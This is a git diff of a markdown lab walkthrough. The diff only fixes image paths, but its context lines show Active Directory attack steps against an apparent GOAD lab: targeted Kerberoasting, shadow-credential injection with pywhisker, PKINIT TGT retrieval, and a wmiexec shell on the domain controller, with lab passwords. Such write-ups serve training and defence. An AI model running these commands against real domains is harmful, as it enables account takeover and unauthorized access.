@@ -175,7 +175,7 @@ Once again, we can use **ldapsearch** to query the **target account** and verify
 ldapsearch -x -H ldap://192.168.1.154 -D "jaremy.rykker@north.sevenkingdoms.local" -w 'Winter123!' -b "DC=north,DC=sevenkingdoms,DC=LOCAL" "(sAMAccountName=robb.stark)" servicePrincipalName
 ```
 Image below shows the **output** fromt he above **ldapsearch** query. As can be seen, no SPN is attached the target account. 
-![method2-enum-spn](assets\images\dacl-gw-on-user\method2-TargetedKerberoast\method2-spn-enum.png)
+![method2-enum-spn](assets/images/dacl-gw-on-user/method2-TargetedKerberoast/method2-spn-enum.png)
 
 ### Use targetedKerberoast.py to temporarily add an SPN and perform a Kerberoast.
 
@@ -187,7 +187,7 @@ python3 targetedKerberoast.py -v --dc-ip 192.168.1.154 -d north.sevenkingdoms.lo
 ```
 
 Image below shows the **output** of the targetedKerberoast.py script in action. 
-![method2-kerberoast](assets\images\dacl-gw-on-user\method2-TargetedKerberoast\method2-targetedKerberoast-kerberoast.png)
+![method2-kerberoast](assets/images/dacl-gw-on-user/method2-TargetedKerberoast/method2-targetedKerberoast-kerberoast.png)
 
 So elegant... I love it! From here, we can crack the hash as demonstrated in Method 1.
 
@@ -225,7 +225,7 @@ We use **pywhisker.py** to verify whether the target user account we have **Gene
 python3 pywhisker.py -d north.sevenkingdoms.local -u jaremy.rykker -p 'Winter123!' --target robb.stark --dc-ip 192.168.1.154 --action list
 ```
 Image below shows the **output** of the pywhisker.py list query.
- ![method3-pywhisker-list](assets\images\dacl-gw-on-user\method3-shadowcreds\method-3-pywhisker-list-command.png)
+ ![method3-pywhisker-list](assets/images/dacl-gw-on-user/method3-shadowcreds/method-3-pywhisker-list-command.png)
 
 Despite PyWhisker’s response indicating that the user may not have read permissions, this is actually a **promising sign**. Because we already know we have **GenericWrite** permissions over the target account, it’s likely that the **attribute is simply empty** rather than inaccessible. This means no existing key credentials are present, and we are free to proceed with injecting our **public key**.
 
@@ -236,10 +236,10 @@ We then use **PyWhisker** to generate a key pair and inject the **public key** i
 python3 pywhisker.py -d north.sevenkingdoms.local -u jaremy.rykker -p 'Winter123!' --target robb.stark --dc-ip 192.168.1.154 --action add
 ```
 Image below shows the **output** of the pywhisker.py creating a **private and public key pair** and **injecting** public key into the **msDS-KeyCredentialLink** attribute of the robb.stark account.
- ![method3-pywhisker-innject](assets\images\dacl-gw-on-user\method3-shadowcreds\method-3-pywhisker-injecting-key.png)
+ ![method3-pywhisker-innject](assets/images/dacl-gw-on-user/method3-shadowcreds/method-3-pywhisker-injecting-key.png)
 
 Once the certificate and private and poublic keys pairs have been created, they will be saved locally your current directory. 
- ![method3-pywhisker-savedlocally](assets\images\dacl-gw-on-user\method3-shadowcreds\method3-pywhisker-cert-keys-saved-local.png)
+ ![method3-pywhisker-savedlocally](assets/images/dacl-gw-on-user/method3-shadowcreds/method3-pywhisker-cert-keys-saved-local.png)
 
 ### PKINITTools Get TGT Locally
 
@@ -253,7 +253,7 @@ Now that we’ve successfully created a certificate and key pair, with the publi
 python3 gettgtpkinit.py -cert-pfx /pywhisker/ead5c0IU.pfx -pfx-pass lKkq4401FwmYnmid4TeP north.sevenkingdoms.local/robb.stark robb.stark_TGT.ccache -dc-ip 192.168.1.154
 ```
 Image below shows the **output** of gettgtpkinit.py authenticating using the pywhisker certificate and saving the TGT locally.
- ![method3-gettgtpkinit-auth](assets\images\dacl-gw-on-user\method3-shadowcreds\method3-gettgtpkinit-Command.png)
+ ![method3-gettgtpkinit-auth](assets/images/dacl-gw-on-user/method3-shadowcreds/method3-gettgtpkinit-Command.png)
 
 Once the TGT has been saved locally, we can import it into our environment using the **KRB5CCNAME** environment variable. This allows Kerberos-aware tools to automatically use the TGT for authentication.
 
@@ -268,7 +268,7 @@ This will display the ticket cache and confirm that the TGT for the target user 
 klist
 ```
 The image below shows the TGT has been saved locally as **robb.stark_TGT.ccache**. It is then exported using the **export KRB5CCNAME** command and verified in memory using **klist**.
- ![method3-klist](assets\images\dacl-gw-on-user\method3-shadowcreds\method3-tgt-saved-locally-klist.png)
+ ![method3-klist](assets/images/dacl-gw-on-user/method3-shadowcreds/method3-tgt-saved-locally-klist.png)
 
 ### Obtain a Shell Using Wmiexec and a Forged TGT
 
@@ -280,6 +280,6 @@ python3 wmiexec.py -k -no-pass north.sevenkingdoms.local/robb.stark@winterfell.n
 ```
 
 The image below shows a shell has been gained using Kerberos authentication as robb.stark.
- ![method3-shell](assets\images\dacl-gw-on-user\method3-shadowcreds\method3-shell.png)
+ ![method3-shell](assets/images/dacl-gw-on-user/method3-shadowcreds/method3-shell.png)
 
  **And that’s it, we’ve successfully abused GenericWrite and Shadow Credentials to obtain a shell on the domain controller, without ever compromising the user’s actual credentials.**
